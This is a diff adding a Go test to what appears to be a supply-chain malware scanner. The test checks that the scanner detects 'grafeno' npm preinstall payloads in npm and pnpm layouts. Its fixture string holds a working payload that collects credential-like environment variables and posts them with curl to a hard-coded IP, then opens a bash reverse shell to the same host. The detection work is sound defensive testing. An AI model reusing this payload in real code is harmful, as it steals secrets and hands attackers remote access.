@@ -2037,6 +2037,55 @@ func TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules(t *testi
 	}
 }
 
+// TestScan_AmazonInspectorGrafenoUnderNodeModules proves the bounded walker
+// reaches the three grafeno preinstall payloads in npm and pnpm layouts without
+// opening a lookalike package carrying the same source markers.
+func TestScan_AmazonInspectorGrafenoUnderNodeModules(t *testing.T) {
+	raw := []byte(`const secrets = Object.entries(process.env).filter(([key]) => /AWS|TOKEN|KEY|SECRET|PASS|API/.test(key)); const blob = Buffer.from(JSON.stringify({ host: os.hostname(), user: os.userInfo().username, secrets })).toString("base64"); execSync("curl -d " + blob + " http://216.126.236.46/r.php"); if (process.platform !== "win32") execSync("bash -c 'bash -i >& /dev/tcp/216.126.236.46/4444 0>&1'");`)
+	for _, packageName := range []string{"grafeno-billing", "grafeno-payments", "grafeno-webhook"} {
+		for _, layout := range []struct {
+			name string
+			rel  string
+		}{
+			{name: "npm", rel: filepath.Join("node_modules", packageName, "preinstall.js")},
+			{name: "pnpm", rel: filepath.Join("node_modules", ".pnpm", packageName+"@1.0.0", "node_modules", packageName, "preinstall.js")},
+		} {
+			t.Run(packageName+" "+layout.name, func(t *testing.T) {
+				root := t.TempDir()
+				payload := filepath.Join(root, layout.rel)
+				if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+					t.Fatal(err)
+				}
+				if err := os.WriteFile(payload, raw, 0o644); err != nil {
+					t.Fatal(err)
+				}
+
+				lookalike := filepath.Join(root, "node_modules", "other-package", "preinstall.js")
+				if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+					t.Fatal(err)
+				}
+				if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
+					t.Fatal(err)
+				}
+
+				res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+				if err != nil {
+					t.Fatalf("scan: %v", err)
+				}
+				got := 0
+				for _, f := range res.Findings {
+					if f.RuleID == "amazon-inspector-npm-malware-ioc" {
+						got++
+					}
+				}
+				if got != 1 {
+					t.Fatalf("amazon-inspector-npm-malware-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+				}
+			})
+		}
+	}
+}
+
 // TestScan_TimeoutHonored asserts that ScanTimeout terminates a slow scan
 // gracefully and still returns the partial result.
 func TestScan_TimeoutHonored(t *testing.T) {
